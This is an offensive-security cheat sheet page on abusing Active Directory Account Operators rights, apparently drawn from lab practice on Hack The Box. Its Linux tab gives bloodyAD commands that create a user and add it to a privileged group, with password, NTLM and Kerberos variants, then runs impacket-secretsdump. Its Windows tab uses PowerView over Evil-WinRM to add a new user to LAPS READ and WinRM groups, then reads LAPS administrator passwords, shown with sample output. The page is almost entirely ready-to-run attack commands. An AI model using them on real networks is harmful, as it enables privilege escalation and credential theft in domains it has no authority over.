---
title: "Account Operators"
tags: ["Active Directory", "Account Operators", "Create User", "Credential Dumping", "Evil-WinRM", "Group Membership Abuse", "LAPS", "PowerView", "Privilege Escalation", "Windows"]
---

{{< filter_buttons >}}

### Create a New User Account and Add it to Privilege Group

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Create a New User Account

```console {class="password"}
# Password
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
```

```console {class="ntlm"}
# NTLM
bloodyAD -d '<DOMAIN>' -u '<USER>' -p ':<HASH>' -f rc4 --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<HASH>' -f rc4 -k --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -k --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
```

#### 2. Add the New User to Privilege Group

```console {class="password"}
# Password
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
```

```console {class="ntlm"}
# NTLM
bloodyAD -d '<DOMAIN>' -u '<USER>' -p ':<HASH>' -f rc4 --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<HASH>' -f rc4 -k --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -k --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
```

#### 3. Secrets Dump

```console {class="password"}
# Password
impacket-secretsdump '<DOMAIN>/<NEW_USER>:<NEW_PASSWORD>@<TARGET>'
```

```console {class="ntlm"}
# NTLM
impacket-secretsdump '<DOMAIN>/<NEW_USER>@<TARGET>' -hashes :<HASH>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-secretsdump '<DOMAIN>/<NEW_USER>:<NEW_PASSWORD>@<TARGET>' -k
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-secretsdump '<DOMAIN>/<NEW_USER>@<TARGET>' -hashes :<HASH> -k
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-secretsdump '<DOMAIN>/<NEW_USER>@<TARGET>' -k
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Create a New User Password Object

```console
$new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -Force
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> $new_user_password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force
```

#### 3. Create a New User Account

```console
New-AdUser '<NEW_USER>' -enabled $true -accountpassword $new_user_password
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> New-AdUser 'alice' -enabled $true -accountpassword $new_user_password
```

#### 4. Add the New User to LAPS Group

```console
Add-DomainGroupMember -Identity 'LAPS READ' -Members '<NEW_USER>'
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'LAPS READ' -Members 'alice'
```

#### 5. Add the New User to WinRM Group

```console
Add-DomainGroupMember -Identity 'WinRM' -Members '<NEW_USER>'
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity WinRM -Members 'alice'
```

#### 6. Remote as New User

```console {class="password"}
# Password
evil-winrm -i <TARGET> -u '<NEW_USER>' -p '<NEW_USER_PASSWORD>'
```

```console {class="sample-code"}
$ evil-winrm -i 127.0.0.1 -u alice -p 'Test1234'              
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alice\Documents> 
```

```console {class="ntlm"}
# NTLM
evil-winrm -i <TARGET> -u '<NEW_USER>' -H '<NEW_HASH>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
evil-winrm -i <TARGET> -r <DOMAIN>
```

#### 7. Read LAPS Password

```console
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\alice\Documents> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd

DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
DNSHostName       : PivotAPI.LicorDeBellota.htb
Enabled           : True
ms-Mcs-AdmPwd     : 82SD67Cuq34TPZm4mnFo
Name              : PIVOTAPI
ObjectClass       : computer
ObjectGUID        : 98783674-e6a3-4d9e-87e3-efe5f31fabbf
SamAccountName    : PIVOTAPI$
SID               : S-1-5-21-842165252-2479896602-2762773115-1004
UserPrincipalName :
```

{{< /tabcontent >}}
